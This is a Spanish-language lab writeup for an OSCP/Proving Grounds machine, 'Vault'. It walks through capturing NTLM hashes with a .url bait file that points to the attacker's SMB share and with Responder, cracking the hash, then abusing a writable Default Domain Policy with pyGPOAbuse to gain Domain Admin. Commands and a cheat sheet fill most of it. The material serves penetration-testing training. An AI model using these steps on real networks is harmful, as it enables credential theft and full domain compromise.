# Máquina "Vault" (vault.offsec) — Writeup detallado (OSCP / PG)

**Objetivo:** Domain Controller del dominio `vault.offsec`
**Atacante (Kali):** tun0 (IP de la VPN)

Resumen de la cadena:
**Share SMB escribible → NTLM theft con fichero `.url` (URI attack) + Responder → crackeo del NetNTLMv2 → WinRM como `anirudh` (user) → GPO abuse sobre la Default Domain Policy → Domain Admin / SYSTEM.**

---

## 0. Conceptos base

- **NTLM theft / forced authentication:** se deja en un recurso que la víctima abrirá un fichero que apunta a una ruta UNC (`\\IP_atacante\...`). Al renderizar la carpeta (p. ej. para pintar el icono), Windows intenta acceder a esa ruta por SMB y **autentica automáticamente**, soltando el **Net-NTLMv2** del usuario, que captura Responder.
- **Net-NTLMv2:** hash de red (no el NT del disco). Se **crackea offline** (hashcat `-m 5600`) o se usa en relay.
- **GPO (Group Policy Object):** objeto de directiva que el DC distribuye a las máquinas del dominio. Si puedes **editar una GPO**, puedes forzar que las máquinas a las que aplica ejecuten código **como SYSTEM**. Si la GPO es la *Default Domain Policy*, aplica a todo el dominio, DC incluido.

---

## 1. Foothold: NTLM theft en un share escribible (URI attack)

El briefing pedía un "URI attack". Teníamos acceso de **escritura** a un share SMB.

### 1.1 Levantar Responder
```bash
sudo responder -I tun0
```
Deja la ventana corriendo. Los hashes capturados, además de imprimirse ahí, se guardan en:
```
/usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt
```
> Ojo: Responder solo imprime cada hash único **una vez por sesión**; si parece que "no captura", mira el fichero de log.

### 1.2 Crear el cebo `.url` (en Kali)
```bash
cat > '@test.url' <<'EOF'
[InternetShortcut]
URL=http://x/
WorkingDirectory=x
IconFile=\\<IP_TUN0>\share\icon.ico
IconIndex=1
EOF
```
La clave es `IconFile=\\<IP_TUN0>\...`: para pintar el icono, el Explorer sale a esa UNC → SMB saliente → hash. El `@` al inicio del nombre lo coloca arriba del todo en la carpeta (se renderiza antes).

### 1.3 Subir el cebo a la RAÍZ del share
```bash
smbclient //<IP>/<share> -U '<user>'
smb: \> put '@test.url'
smb: \> ls          # confirmar
```
> **Lección importante:** el fichero debe ir en la **raíz del share**, no en una subcarpeta. El usuario/proceso simulado que recorre el share normalmente solo abre el nivel superior. (Esto costó un rato: en una subcarpeta no disparaba nada.)

### 1.4 Esperar la captura
Revisa cada 1-2 min:
```bash
watch -n 5 'cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt 2>/dev/null'
```
Aparece el Net-NTLMv2 de **anirudh**.

---

## 2. Crackeo del hash

```bash
# la línea completa  anirudh::VAULT:....
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
Sale la contraseña de `anirudh`.

---

## 3. Acceso de usuario

```bash
nxc winrm <IP> -u anirudh -p '<pass>'        # (Pwn3d!)
evil-winrm -i <IP> -u anirudh -p '<pass>'
type C:\Users\anirudh\Desktop\local.txt
```

---

## 4. Escalada a Domain Admin: GPO Abuse

### 4.1 Enumerar permisos sobre GPOs

El briefing pedía identificar GPOs **escribibles**. Desde la shell (módulo GroupPolicy de Windows):
```powershell
Get-GPO -All | ForEach-Object {
  $gpo = $_
  Get-GPPermission -Guid $gpo.Id -All | Where-Object {
    $_.Permission -in @("GpoEdit","GpoEditDeleteModifySecurity") -and
    $_.Trustee.Name -eq $env:USERNAME
  } | Select-Object @{N='GPO';E={$gpo.DisplayName}}, @{N='Trustee';E={$_.Trustee.Name}}, Permission
}
```
Resultado:
```
GPO                   Trustee  Permission
---                   -------  ----------
Default Domain Policy anirudh  GpoEditDeleteModifySecurity
```

`GpoEditDeleteModifySecurity` = control total de edición sobre la **Default Domain Policy**, que aplica al DC → SYSTEM al alcance.

> Alternativa de enumeración: **BloodHound** (arista `GpoEdit`/`WriteGPLink`) o PowerView (`Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs`).

GUID fijo de la Default Domain Policy: `31B2F340-016D-11D2-945F-00C04FB984F9`.

### 4.2 Abusar de la GPO — pyGPOAbuse (desde Kali)

```bash
git clone https://github.com/Hackndo/pyGPOAbuse
cd pyGPOAbuse
python3 pygpoabuse.py vault.offsec/anirudh:'<pass>' \
  -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' \
  -command 'net group "Domain Admins" anirudh /add /domain' \
  -taskname 'Update' -description 'Update'
# [+] ScheduledTask Update created!
```
Esto inyecta en la GPO una **tarea programada inmediata** que el equipo ejecuta **como SYSTEM** y añade a `anirudh` al grupo **Domain Admins**.

> Desde Linux las comillas de `"Domain Admins"` no dan problema (zsh/bash las pasa limpias); el lío de comillas solo aparecía al hacerlo desde la shell de Windows con SharpGPOAbuse. Si fueras por esa vía, usar `Administrators` (sin espacios) lo evita.

> Alternativa desde la shell Windows: **SharpGPOAbuse**
> ```
> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author vault.offsec\anirudh --Command "cmd.exe" --Arguments "/c net localgroup Administrators anirudh /add" --GPOName "Default Domain Policy"
> ```

### 4.3 Aplicar la GPO y verificar
```powershell
gpupdate /force          # o esperar 1-2 min al refresco automático
net localgroup Administrators     # anirudh debe aparecer
```
Reconectar para recoger el nuevo grupo en el token:
```bash
evil-winrm -i <IP> -u anirudh -p '<pass>'
whoami /groups
type C:\Users\Administrator\Desktop\proof.txt
```

---

## 5. Chuleta rápida

```bash
# Foothold (NTLM theft)
sudo responder -I tun0
printf '[InternetShortcut]\nURL=http://x/\nWorkingDirectory=x\nIconFile=\\\\<IP_TUN0>\\share\\icon.ico\nIconIndex=1\n' > '@test.url'
smbclient //<IP>/<share> -U '<user>'    # put '@test.url'  (en la RAIZ)
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Crackear
hashcat -m 5600 hash.txt rockyou.txt

# User
evil-winrm -i <IP> -u anirudh -p '<pass>'

# Enumerar GPOs escribibles -> Default Domain Policy (GpoEditDeleteModifySecurity)
# GPO abuse
python3 pygpoabuse.py vault.offsec/anirudh:'<pass>' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net group "Domain Admins" anirudh /add /domain'
gpupdate /force
# reconectar: whoami /groups -> VAULT\Domain Admins ; type C:\Users\Administrator\Desktop\proof.txt
```

---

## 6. Lecciones clave

1. **NTLM theft:** el cebo (`.url`/`.lnk`/`.scf`) va en la **raíz del share**. El `.url` con `IconFile=\\IP\...` es el más fiable hoy (el `.scf` está parcheado en Windows modernos).
2. **Responder guarda todo en `/usr/share/responder/logs/`** y solo imprime cada hash único una vez. No te fíes solo de la pantalla.
3. **Enumera permisos de GPO** (`Get-GPPermission`, PowerView, BloodHound). `GpoEdit` / `GpoEditDeleteModifySecurity` sobre una GPO que aplica al DC = SYSTEM.
4. **GPO abuse = tarea inmediata como SYSTEM.** pyGPOAbuse (Kali, con pass/hash) o SharpGPOAbuse (shell). Añadir al grupo Administrators o lanzar un reverse shell.
5. **Evita grupos con espacios** (`"Domain Admins"`) si puedes; `Administrators` en un DC equivale a admin del dominio y se escribe sin comillas problemáticas.
6. **Tras cambiar de grupo, reconéctate**: el token solo recoge el nuevo grupo en un login nuevo.
